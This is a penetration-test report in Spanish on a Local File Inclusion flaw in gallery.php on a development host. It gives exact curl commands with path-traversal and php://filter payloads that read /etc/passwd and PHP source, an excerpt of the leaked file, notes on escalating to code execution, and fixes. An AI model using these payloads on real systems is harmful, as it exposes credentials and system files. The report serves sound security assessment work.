# Informe de análisis LFI — Galería de Arte Virtual

Fecha: 2026-04-18T12:43:52
Objetivo: http://web.dev.local:8081 (gallery.php)

Resumen ejecutivo:
Se identificó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro "page" de gallery.php. Se logró leer ficheros sensibles del sistema, incluyendo /etc/passwd, confirmando acceso a ficheros del sistema operativo.

Detalles técnicos:
- URL objetivo: http://web.dev.local:8081/gallery.php
- Parámetro vulnerable: page

Reconocimiento y fuzzing realizado (comandos exactos):
1) Probe inicial de cabeceras:
   curl -s -D - http://web.dev.local:8081 -o /dev/null

2) Pruebas de LFI por parámetros comunes (ejecución de ejemplo):
   for p in page file path include template view inc; do 
     curl -sG --data-urlencode "$p=../../../../../../../../etc/passwd" "http://web.dev.local:8081";
   done

3) Prueba puntual sobre gallery.php con traversal:
   curl -sG --max-time 10 --data-urlencode 'page=../../../../../../etc/passwd' 'http://web.dev.local:8081/gallery.php' -i

4) Prueba usando php://filter para lectura base64:
   curl -sG --max-time 10 --data-urlencode 'page=php://filter/read=convert.base64-encode/resource=gallery.php' 'http://web.dev.local:8081/gallery.php' -i

Payloads que confirmaron LFI y ficheros leídos:
- ../../../../../../etc/passwd  => permitió leer /etc/passwd (contenido incluido en la respuesta HTML)
- php://filter/read=convert.base64-encode/resource=gallery.php => permite obtener contenido base64 del propio archivo PHP (útil para extracción cuando hay filtros)

Prueba de explotación (impacto):
- Se logró leer /etc/passwd desde la aplicación web usando LFI (ver extracto):
  root:x:0:0:root:/root:/bin/bash
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  ...

Evidencias (archivos generados durante el análisis):
- /tmp/gallery_lfi_passwd.txt (respuesta completa con /etc/passwd embebido)
- /tmp/gallery_phpfilter.txt (respuesta a php://filter)

Impacto y recomendaciones:
Impacto:
- LFI confirmado: exposición de ficheros locales del sistema operativo y de la aplicación.
- Con suficiente acceso, un atacante podría extraer credenciales, claves privadas o escalar a RCE mediante técnicas adicionales (log poisoning, /proc/self/environ, inclusión de archivos controlados).

Recomendaciones:
1. Validar y sanear el parámetro "page" y forbide inclusion of arbitrary files. Use allowlist mapping to specific templates.
2. Evitar uso de include($_GET['page']) sin saneamiento.
3. Deshabilitar wrappers peligrosos si no se usan (php://filter), y configurar open_basedir si es aplicable.
4. Revisar logs para detectar accesos sospechosos.

Anexos (payloads y comandos resumidos):
- curl 'http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd'
- curl 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php'

Fin del informe.
